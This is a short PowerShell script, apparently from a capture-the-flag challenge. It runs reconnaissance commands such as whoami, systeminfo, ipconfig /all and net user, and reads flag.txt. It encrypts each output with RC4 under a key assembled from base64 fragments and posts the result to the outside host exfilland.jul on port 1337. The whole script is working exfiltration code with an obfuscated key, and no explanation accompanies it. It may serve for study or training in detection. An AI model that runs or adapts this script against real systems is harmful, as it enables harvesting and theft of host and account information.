$commands = @(
    "dir",
    "whoami",
    "systeminfo",
    "ipconfig /all",
    "type flag.txt",
    "net user"
)

function Encrypt {
    param (
        [string]$PlainText,
        [string]$Key
    )
    $S = 0..255
    $j = 0
    $KeyBytes = [System.Text.Encoding]::ASCII.GetBytes($Key)
    $TextBytes = [System.Text.Encoding]::ASCII.GetBytes($PlainText)

    for ($i = 0; $i -lt 256; $i++) {
        $j = ($j + $S[$i] + $KeyBytes[$i % $KeyBytes.Length]) % 256
        $S[$i], $S[$j] = $S[$j], $S[$i]
    }

    $i = 0
    $j = 0
    $CipherBytes = @()
    foreach ($byte in $TextBytes) {
        $i = ($i + 1) % 256
        $j = ($j + $S[$i]) % 256
        $S[$i], $S[$j] = $S[$j], $S[$i]
        $K = $S[($S[$i] + $S[$j]) % 256]
        $CipherBytes += $byte -bxor $K
    }

    return [Convert]::ToBase64String($CipherBytes)
}

function Get-Key {
    $keyParts = @(
        "SnVsMw==",  # "Jul3"
        "YjRs", # "b4l"
        "STN4ZjFs", # "I3xf1l"
        "bDRuZCE=" # "l4nd!"
    )
    return ($keyParts | ForEach-Object { [System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($_)) }) -join ""
}

function Send-Exfil {
    param (
        [string]$Data
    )
    $Uri = "http://exfilland.jul:1337"
    $Body = @{ data = $Data }
    try {
        Invoke-WebRequest -Uri $Uri -Method POST -Body $Body -UseBasicParsing | Out-Null
    } catch {
        Write-Host "Error sending data to $Uri"
    }
}

foreach ($cmd in $commands) {
    try {
        $output = cmd.exe /c $cmd 2>&1
        $encrypted = Encrypt -PlainText $output -Key $(Get-Key)
        Send-Exfil -Data $encrypted
    } catch {
        Write-Host "Error executing command: $cmd"
    }
}
